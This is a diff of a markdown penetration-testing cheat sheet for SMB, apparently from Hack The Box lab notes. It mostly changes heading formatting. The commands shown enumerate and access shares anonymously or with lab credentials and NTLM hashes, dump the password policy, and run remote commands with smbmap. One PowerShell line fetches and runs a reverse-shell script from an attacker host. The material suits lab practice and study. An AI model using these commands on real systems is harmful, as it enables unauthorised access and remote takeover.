@@ -80,7 +80,7 @@
 ```
 ### Samba
 
-###### Trying to List smb share using Guest account 
+###### `Trying to List smb share using Guest account`
 ```
 nmap -p139,445 --min-rate=1000 --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-services,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-ls,smb-mbenum,smb-os-discovery,smb-print-text,smb-protocols -sC -sV -T4 -A chatterbox.htb
 netexec smb 10.10.10.111 -u Guest -p "" --shares 
@@ -88,38 +88,36 @@ netexec --verbose smb 10.10.10.111 -u Guest -p "" --shares
 smbmap -u "guest" -p "" -H 10.10.10.134
 smbclient -U guest //10.10.10.134/Backups
 ```
-###### Dumbing Password Policy through SMB Share
+###### `Dumbing Password Policy through SMB Share`
 ```
 netexec --verbose smb 10.10.10.111 -u Guest -p "" --pass-pol
 ```
-###### Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share
+###### `Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share`
 ```
 # smbclient //10.10.11.174/support-tools            
 Password for [WORKGROUP\root]:
 Try "help" to get a list of possible commands.
 smb: \> dir
 ```
-###### Connecting using `smbclient` with Credentials
+###### `Connecting using smbclient with Credentials`
 ```
 # smbclient -U 'fabricorp.local/tlavel%Fabricorp01' //10.10.10.193/C$
 # smbclient -U 'administrator%Welcome1!' \\\\10.10.10.74\\C$ 
 ```
-###### Spidering SMB shares
-
+###### `Spidering SMB shares`
 ```
 netexec --verbose smb 10.10.10.111 -u Guest -p "" --spider IPC$
 ```
-###### Listing the SMB Shares without password using smbclient
-
+###### `Listing the SMB Shares without password using smbclient`
 ```
 $ smbclient --no-pass -L 10.10.10.134
 $ smbclient --no-pass -L //<IP> # Null user
 ```
-###### Listing SMB Share using Password or NTLM hash
+###### `Listing SMB Share using Password or NTLM hash`
 ```
 $ smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
 ```
-###### Getting the file from SMB Share without password anonymously 
+###### `Getting the file from SMB Share without password anonymously`
 ```
 ──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
 └─# smbclient //10.10.11.174/support-tools -c 'get putty.exe' 
@@ -130,16 +128,16 @@ getting file \putty.exe of size 1273576 as putty.exe (1294.2 KiloBytes/sec) (ave
 └─# ls                                                        
 putty.exe
 ```
-###### Execute Command using `smbmap`
+###### `Execute Command using smbmap`
 ```
 # smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -d NEST.HTB -x 'net user' -H 10.10.10.178   
 	# The `-d` switch can be ignored. 
 ```
-###### smbmap - Non Recursive Path Listing
+###### `smbmap - Non Recursive Path Listing`
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users/C.Smith/HQK Reporting' -H 10.10.10.178
 ```
-###### Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.
+###### `Get a Reverse shell using smbmap. Make sure python server and nc listener is running.`
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
 ```
